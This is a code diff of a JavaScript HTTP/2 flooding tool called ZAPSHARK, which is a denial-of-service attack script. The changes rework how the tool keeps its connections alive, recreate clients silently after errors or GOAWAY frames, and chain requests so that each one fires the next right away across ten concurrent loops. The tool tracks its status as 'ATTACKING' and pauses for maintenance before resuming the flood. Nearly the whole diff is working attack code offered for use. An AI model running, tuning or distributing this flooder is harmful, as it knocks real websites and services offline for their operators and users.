@@ -19,61 +19,66 @@ class ZAPSHARK {
         this.maintenanceDuration = 600000;
         
         this.clients = [];
-        this.maxClients = 10; // Multiple connections for max speed
+        this.maxClients = 5;
     }
 
     createClient() {
         try {
-            const client = http2.connect(this.targetUrl, {
-                maxSessionMemory: 1000000,
-                maxHeaderListPairs: 10000
-            });
+            const client = http2.connect(this.targetUrl);
             
             client.on('error', () => {
-                // Ignore all errors - keep going
-                setTimeout(() => this.createClient(), 100);
+                // Silently recreate on error
+                setTimeout(() => this.createClient(), 50);
             });
             
             client.on('goaway', () => {
-                // Ignore goaway - recreate connection
-                setTimeout(() => this.createClient(), 100);
+                setTimeout(() => this.createClient(), 50);
             });
             
             this.clients.push(client);
             return client;
         } catch (err) {
-            setTimeout(() => this.createClient(), 100);
+            setTimeout(() => this.createClient(), 50);
         }
     }
 
     sendRequest() {
-        const client = this.clients[Math.floor(Math.random() * this.clients.length)] || this.createClient();
-        if (!client) return;
+        if (this.clients.length === 0) {
+            this.createClient();
+            return;
+        }
+
+        const client = this.clients[Math.floor(Math.random() * this.clients.length)];
+        if (!client || client.destroyed) {
+            this.createClient();
+            return;
+        }
 
         try {
             const req = client.request({ 
                 ':method': 'GET', 
-                ':path': '/',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                ':path': '/'
             });
             
-            req.on('response', () => {
-                // Don't wait for response - just destroy immediately
-                req.destroy();
+            // CONFIRM SENT - then immediately send next
+            req.on('ready', () => {
+                this.totalRequests++;
+                this.requestsSinceLastCalc++;
+                this.sendRequest(); // IMMEDIATE NEXT REQUEST
             });
             
             req.on('error', () => {
-                req.destroy();
+                this.totalRequests++;
+                this.requestsSinceLastCalc++;
+                this.sendRequest(); // IMMEDIATE NEXT REQUEST
             });
             
-            // Send and forget - no waiting
             req.end();
             
         } catch (err) {
-            // Ignore all errors
-        } finally {
             this.totalRequests++;
             this.requestsSinceLastCalc++;
+            this.sendRequest(); // IMMEDIATE NEXT REQUEST
         }
     }
 
@@ -117,15 +122,12 @@ class ZAPSHARK {
 
     flushSockets() {
         this.clients.forEach(client => {
-            try {
-                client.destroy();
-            } catch (err) {}
+            try { client.destroy(); } catch (err) {}
         });
         this.clients = [];
         
-        // Recreate clients
         for (let i = 0; i < this.maxClients; i++) {
-            setTimeout(() => this.createClient(), i * 100);
+            setTimeout(() => this.createClient(), i * 50);
         }
     }
 
@@ -135,7 +137,6 @@ class ZAPSHARK {
         
         if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
             this.status = "PAUSED";
-            
             this.flushDNS();
             this.flushSockets();
             
@@ -150,39 +151,41 @@ class ZAPSHARK {
     resumeAttack() {
         this.status = "ATTACKING";
         this.lastMaintenance = Date.now();
+        this.startAttack();
     }
 
     startAttack() {
-        // ULTIMATE SPEED - minimal delay with multiple concurrent loops
-        const attackLoops = 5; // Multiple attack loops for max resource usage
+        // START FLOOD - multiple concurrent attack chains
+        const concurrentChains = 10;
         
-        for (let i = 0; i < attackLoops; i++) {
+        for (let i = 0; i < concurrentChains; i++) {
             setImmediate(() => {
-                const attack = () => {
+                // Each chain immediately triggers next request on confirmation
+                const attackChain = () => {
                     if (this.status === "ATTACKING") {
                         this.sendRequest();
-                        setImmediate(attack); // No delay - maximum speed
+                    } else {
+                        setTimeout(attackChain, 100);
                     }
                 };
-                attack();
+                attackChain();
             });
         }
     }
 
     async start() {
-        // Clear terminal 2x
         process.stdout.write('\x1B[2J\x1B[0f');
         process.stdout.write('\x1B[2J\x1B[0f');
         
-        // Create multiple HTTP/2 clients
+        // Create clients
         for (let i = 0; i < this.maxClients; i++) {
-            setTimeout(() => this.createClient(), i * 50);
+            this.createClient();
         }
         
         // Start attack after brief setup
         setTimeout(() => {
             this.startAttack();
-        }, 1000);
+        }, 500);
         
         // Update display
         setInterval(() => {
@@ -202,9 +205,7 @@ class ZAPSHARK {
     stop() {
         this.running = false;
         this.clients.forEach(client => {
-            try {
-                client.destroy();
-            } catch (err) {}
+            try { client.destroy(); } catch (err) {}
         });
         process.exit(0);
     }
